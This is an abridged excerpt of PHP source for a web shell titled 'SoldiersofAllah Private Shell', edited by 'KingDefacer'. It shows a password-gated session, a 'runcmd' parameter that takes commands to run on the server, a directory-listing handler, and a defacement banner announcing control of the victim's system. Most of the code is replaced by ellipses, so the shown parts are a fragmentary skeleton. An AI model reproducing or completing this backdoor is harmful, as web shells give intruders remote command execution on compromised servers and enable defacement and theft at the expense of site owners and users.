...
if ($_SESSION[$sess] == $password) {
    ...
    if (isset($_GET['runcmd'])) {
        ...
        if ('' == $cmd) {
            ...
            echo '<b><font size=5><center>In The Name Of Allah<center></b></font>
...
=[]= Soldiers of Allah was here and controlling your system =[]=
        ...
        elseif (ereg('listdir (.*)', $cmd, $directory)) {
            ...
            echo "Soldiers of Allah private shell.<br>Version $version";
        }
        //Show info
...
<title>SoldiersofAllah Private Shell | Edited By KingDefacer ~ <?php echo getenv('HTTP_HOST'); ?></title>
<head>
<?php echo $style; ?>
...
<?php
    ...
    ?>
<html>
<title>Login Step ~ <?php echo getenv('HTTP_HOST'); ?></title>
<style type="text/css">
/* Circle Text Styles */
#outerCircleText {
...
<?php echo '<center><table border=0  height=100%>
<td valign=middle>
